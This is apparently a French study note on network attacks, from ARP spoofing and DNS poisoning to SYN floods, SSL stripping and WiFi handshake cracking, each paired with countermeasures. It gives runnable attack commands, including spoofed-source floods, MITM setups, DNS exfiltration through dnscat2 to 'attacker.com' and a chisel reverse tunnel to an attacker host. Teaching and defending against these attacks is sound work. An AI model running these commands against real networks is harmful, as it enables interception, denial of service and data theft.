---
title: "Attaques Réseau"
domain: "Applied Sciences"
subdomain: "Computer Science > Security > Networking"
tags: [sciences-appliquées, informatique, sécurité, réseau]
date: "2026-02-25"
---

# Attaques Réseau

Les attaques réseau exploitent les faiblesses des protocoles de communication, des configurations d'équipements ou de l'implémentation des services. Cette note couvre les principales techniques d'attaque et leurs mécanismes, avec les contremesures associées.

## Sniffing réseau

Le sniffing consiste à capturer et analyser les paquets transitant sur un réseau. En mode **promiscuous**, une interface réseau capture tous les paquets, pas seulement ceux qui lui sont destinés.

### Sniffing passif vs actif

| Type | Description | Contexte |
|------|-------------|---------|
| Passif | Capture sans envoyer de paquets supplémentaires | Hub (broadcast par nature) |
| Actif | Envoie des paquets pour contourner les switches | Switch (unicast par port) |

**Techniques de sniffing actif** :
- MAC Flooding (saturer la CAM table → mode hub)
- ARP Poisoning (redirection du trafic)
- DHCP Spoofing (fausse gateway)
- DNS Poisoning
- Port Mirroring / SPAN (configuration légitime détournée)

**Outils de sniffing** :
```bash
# Wireshark (GUI)
# tshark (CLI Wireshark)
tshark -i eth0 -w capture.pcap
tshark -r capture.pcap -Y "http"

# tcpdump
tcpdump -i eth0 -w capture.pcap
tcpdump -r capture.pcap port 80

# Mode promiscuous
ip link set eth0 promisc on
```

**Protocoles vulnérables au sniffing** (données en clair) :
- HTTP, FTP, Telnet, POP3, IMAP, SMTP (sans TLS), Rlogin, NNTP

**Contremesures** :
- Utiliser des protocoles chiffrés (HTTPS, SSH, SFTP, IMAPS, SMTPS)
- Segmentation réseau (VLANs)
- Chiffrement de bout en bout (VPN, TLS)
- Détection d'interfaces en mode promiscuous (arpwatch, nmap)

## Attaques de la couche 2 (Data Link)

### ARP Spoofing / ARP Poisoning

**Mécanisme** : ARP (Address Resolution Protocol) résout les adresses IP en adresses MAC sur un réseau local. ARP est stateless et sans authentification — n'importe qui peut envoyer une réponse ARP non sollicitée.

```
Attaquant envoie :
"L'IP 192.168.1.1 (gateway) est à MA:CA:DR:ES:SE:01"
→ Toutes les machines mettent à jour leur table ARP
→ Le trafic destiné à la gateway passe par l'attaquant
→ MITM (Man In The Middle) établi
```

```bash
# ARP spoofing avec arpspoof
arpspoof -i eth0 -t 192.168.1.10 192.168.1.1  # Cible ← Gateway
arpspoof -i eth0 -t 192.168.1.1 192.168.1.10  # Gateway ← Cible

# Activer le forwarding IP (ne pas bloquer le trafic)
echo 1 > /proc/sys/net/ipv4/ip_forward

# Avec ettercap (GUI ou CLI)
ettercap -T -q -i eth0 -M arp:remote /192.168.1.1// /192.168.1.10//

# Avec bettercap
bettercap -iface eth0
net.probe on
set arp.spoof.targets 192.168.1.10
arp.spoof on
net.sniff on
```

**Contremesures** :
- Dynamic ARP Inspection (DAI) sur les switches managés
- Entrées ARP statiques pour les équipements critiques
- 802.1X pour authentification des ports
- Segmentation réseau (VLAN)
- Outils de détection : arpwatch, XArp

### MAC Flooding

**Mécanisme** : Saturer la CAM table (Content Addressable Memory) du switch avec des adresses MAC falsifiées. Quand la CAM est pleine, le switch bascule en mode "hub" et envoie tous les paquets sur tous les ports.

```bash
# Avec macof (dsniff suite)
macof -i eth0

# Avec yersinia
yersinia -I  # Interface interactive
```

**Contremesures** :
- Port security sur les switches (limiter le nombre de MAC par port)
- MAC address sticky (mémoriser la première MAC vue)

### VLAN Hopping

**Double Tagging** : Exploiter la suppression du tag 802.1Q natif pour accéder à un VLAN différent.

**Switch Spoofing** : Se faire passer pour un switch en initiant un trunk DTP avec le switch cible.

```bash
# Avec yersinia
yersinia -G  # Mode graphique
# Select 802.1q protocol → Launch attack → Double Tagging
```

**Contremesures** :
- Désactiver DTP sur tous les ports d'accès (`switchport nonegotiate`)
- Changer le VLAN natif (`switchport trunk native vlan 999`)
- Ne jamais utiliser le VLAN 1 comme VLAN natif

## Attaques de la couche réseau (L3)

### IP Spoofing

Forge l'adresse IP source des paquets. Utile pour les attaques de réflexion/amplification et contourner des ACLs basées sur l'IP.

```bash
# Avec Scapy (Python)
from scapy.all import *
send(IP(src="1.2.3.4", dst="target.com")/ICMP())

# SYN flood avec IP spoofée
send(IP(src=RandIP(), dst="target.com")/TCP(dport=80, flags="S"), loop=1)
```

**Contremesures** :
- BCP38 / uRPF (Unicast Reverse Path Forwarding) chez les FAI
- Filtrer les paquets avec adresses sources invalides sur son réseau

### ICMP Redirect

Un routeur peut envoyer un message ICMP Redirect pour suggérer une route plus efficace. Un attaquant peut abuser de ce mécanisme pour rediriger le trafic.

```bash
from scapy.all import *
send(IP(src="192.168.1.1", dst="192.168.1.10") /
     ICMP(type=5, code=1, gw="attacker_ip") /
     IP(src="192.168.1.10", dst="8.8.8.8")/UDP())
```

**Contremesures** : Désactiver l'acceptation des ICMP redirects (`sysctl -w net.ipv4.conf.all.accept_redirects=0`).

## Attaques DNS

### DNS Spoofing / Cache Poisoning

Injecter de fausses réponses DNS dans le cache d'un résolveur pour rediriger les utilisateurs.

**Attaque Kaminsky (2008)** : Exploite le fait que les IDs de transactions DNS sont prévisibles et les ports UDP fixes pour envoyer massivement de fausses réponses.

```
Attaquant :
1. Demande "www.bank.com" au résolveur cible
2. Envoie massivement de fausses réponses avant la vraie
3. Si un ID de transaction match avant la vraie réponse → empoisonnement
```

**DNS Hijacking** : Modifier les serveurs DNS d'un domaine ou d'un routeur.

```bash
# Avec dnschef (serveur DNS malveillant)
dnschef --fakedomains target.com --fakeip attacker_ip

# Avec bettercap
set dns.spoof.domains target.com
set dns.spoof.address attacker_ip
dns.spoof on
```

**Contremesures** :
- DNSSEC (signatures cryptographiques des zones DNS)
- DNS over HTTPS (DoH) ou DNS over TLS (DoT)
- Source Port Randomization (0x20 encoding)

### DNS Amplification (DDoS)

Exploiter des résolveurs DNS ouverts pour amplifier une attaque DDoS. Envoyer des requêtes `ANY` ou `RRSIG` avec l'IP cible comme source.

```
Ratio d'amplification : requête 60 bytes → réponse 3000+ bytes (facteur ×50)
```

**Contremesures** :
- Désactiver les résolveurs DNS ouverts (répondre seulement aux clients légitimes)
- Rate limiting sur les réponses DNS
- BCP38 pour bloquer le spoofing source

### DNS Exfiltration

Utiliser le protocole DNS pour exfiltrer des données (souvent non filtré par les firewalls) :

```bash
# Encoder des données dans les sous-domaines
# data.base64-encoded.attacker-server.com
# Outils : dnscat2, iodine

dnscat2-server attacker.com  # Serveur C2
dnscat2 attacker.com          # Client (sur la victime)
```

**Contremesures** :
- DNS filtering et monitoring (blocklists, longueur sous-domaines)
- DNS RPZ (Response Policy Zones)
- DNS analytics dans le SIEM

## Attaques de la couche transport (L4)

### SYN Flood

**Mécanisme** : Envoyer massivement des paquets SYN avec IP source spoofée. Le serveur alloue des ressources (half-open connections) pour chaque SYN reçu, sans jamais recevoir l'ACK final. Épuisement des ressources → déni de service.

```bash
# hping3 — SYN flood
hping3 --flood --rand-source -S -p 80 target.com

# Avec Scapy
from scapy.all import *
send(IP(src=RandIP(), dst="target.com")/TCP(dport=80, flags="S"), loop=1, verbose=0)
```

**Contremesures** :
- SYN Cookies (ne pas allouer de ressources avant le 3-way handshake complet)
- Rate limiting sur les SYN entrants
- Firewalls stateful

### TCP Session Hijacking

**Mécanisme** : En position MITM, observer les numéros de séquence TCP et injecter des paquets dans une connexion existante.

**RST Attack** : Envoyer un paquet RST avec un numéro de séquence valide pour terminer une connexion.

```python
from scapy.all import *
# RST spoof (si les seq numbers sont connus)
send(IP(src="192.168.1.2", dst="192.168.1.1")/
     TCP(sport=45000, dport=22, flags="R", seq=123456))
```

**Contremesures** :
- Chiffrement (SSH, TLS) rend l'injection inefficace
- Randomisation des numéros de séquence initiaux

## Attaques DDoS

### Types d'attaques DDoS

| Catégorie | Exemples | Amplification |
|-----------|---------|---------------|
| Volumétrique | UDP flood, ICMP flood, DNS amplification | ×50 (DNS), ×70 (NTP) |
| Protocol | SYN flood, Smurf, Ping of Death | Non |
| Application | HTTP flood, Slowloris, RUDY | Non |

### Attaques par amplification majeures

| Protocole | Port | Facteur max | Contre-mesure |
|-----------|------|------------|---------------|
| DNS | 53/UDP | 28-54x | Fermer les open resolvers |
| NTP | 123/UDP | 556x | Désactiver monlist |
| Memcached | 11211/UDP | 51,000x | Bloquer UDP 11211 publiquement |
| SSDP | 1900/UDP | 30x | Bloquer SSDP depuis l'extérieur |
| CharGen | 19/UDP | 358x | Désactiver CharGen |

### Slowloris

Maintenir des connexions HTTP ouvertes le plus longtemps possible en envoyant des headers lentement, épuisant le pool de connexions du serveur.

```bash
# Slowloris avec hping3
# Ou avec le script Perl original
perl slowloris.pl -dns target.com -port 80 -timeout 2000 -num 1000
```

**Contremesures** :
- Limiter les connexions par IP
- Timeout de connexion strict
- Nginx résiste mieux qu'Apache par sa gestion asynchrone

### Contremesures DDoS générales

- **Upstream filtering** : FAI ou service DDoS protection (Cloudflare, Akamai, AWS Shield)
- **Rate limiting** : Limiter le nombre de requêtes par IP/s
- **Anycast** : Distribuer le trafic sur plusieurs POPs géographiques
- **BGP blackholing** : Annoncer la cible comme non-routable (perte de service mais protège l'infra)
- **ACLs** : Bloquer les sources connues d'attaque

## Attaques MITM (Man in the Middle)

### SSL Stripping

Convertir les connexions HTTPS en HTTP transparente pour intercepter le trafic chiffré.

```bash
# SSLstrip avec bettercap
bettercap -iface eth0
arp.spoof on
set https.proxy.sslstrip true
https.proxy on
```

**Contremesures** :
- HSTS (HTTP Strict Transport Security) avec `preload`
- HSTS Preload List dans les navigateurs
- Certificate Pinning

### SSL/TLS MITM

Présenter un faux certificat à la victime (nécessite que la victime accepte le certificat ou qu'un CA soit compromis).

```bash
# Mitmproxy
mitmproxy --mode transparent
# ou
mitmweb  # Interface web
```

**Contremesures** :
- Certificate Transparency (CT logs)
- CAA records DNS
- Certificate Pinning dans les applications
- HPKP (déprécié, remplacé par CT)

## Attaques de routing

### BGP Hijacking

Annoncer frauduleusement des préfixes IP pour détourner le trafic internet. Célèbre incident : Pakistan Telecom vs YouTube (2008), MyEtherWallet (2018).

```
Attaquant annonce : "Je suis le chemin vers 8.8.8.0/24"
→ Si plus spécifique ou meilleur AS-path → certains routeurs préfèrent cette route
→ Trafic Google DNS détourné
```

**Contremesures** :
- RPKI (Resource Public Key Infrastructure) — signer les ROA (Route Origin Authorization)
- BGPsec
- Monitoring BGP (BGPmon, RIPE RIS)

### OSPF/RIP Injection

Sur un réseau interne, si OSPF n'est pas authentifié, injecter de fausses routes :

```bash
# Avec Quagga ou FRRouting
# Annoncer une route plus préférentielle
vtysh -c "conf t" -c "router ospf" -c "network 10.0.0.0/8 area 0"
```

**Contremesures** :
- Authentification MD5/SHA sur OSPF
- Passive interfaces sur les liens non-routeurs
- Route filtering (prefix-lists, distribute-lists)

## Attaques WiFi

### Evil Twin / Rogue AP

Créer un point d'accès WiFi avec le même SSID que le réseau légitime pour capturer les connexions.

```bash
# Avec hostapd-wpe (WPA Enterprise phishing)
hostapd-wpe hostapd-wpe.conf

# Avec airbase-ng
airbase-ng -e "CorporateWiFi" -c 6 wlan0mon
```

**Contremesures** :
- 802.1X / WPA Enterprise (authentification par certificat)
- WIDS (Wireless IDS) pour détecter les rogue APs
- Certificate validation stricte dans les supplicants

### WPA2 Handshake Capture

```bash
# Mettre la carte en mode monitor
airmon-ng start wlan0

# Capturer le handshake
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Deauth pour forcer reconnexion
aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF wlan0mon

# Cracker avec hashcat
hashcat -m 22000 capture.hccapx /usr/share/wordlists/rockyou.txt
```

## Pivot et tunneling

### SSH Tunneling

```bash
# Local port forwarding (accéder à service interne)
ssh -L 8080:internal-server:80 user@pivot

# Remote port forwarding (exposer un service local)
ssh -R 9090:localhost:80 user@server

# SOCKS proxy (router tout le trafic)
ssh -D 1080 user@pivot
proxychains nmap -sT target
```

### Chisel — Tunneling HTTP/HTTPS

```bash
# Serveur (attaquant)
chisel server -p 8080 --reverse

# Client (victime, derrière firewall)
chisel client attacker:8080 R:socks
# → SOCKS5 proxy sur attacker:1080
```

## Résumé des contremesures

| Attaque | Contremesure principale |
|---------|------------------------|
| ARP Spoofing | DAI, port security |
| MAC Flooding | Port security (limit MAC) |
| VLAN Hopping | Désactiver DTP, VLAN natif dédié |
| DNS Spoofing | DNSSEC, DoH/DoT |
| SYN Flood | SYN Cookies, rate limiting |
| DDoS amplification | Fermer services UDP publics, BCP38 |
| SSL Stripping | HSTS + preload |
| BGP Hijacking | RPKI, ROA |
| Evil Twin WiFi | WPA Enterprise + WIDS |
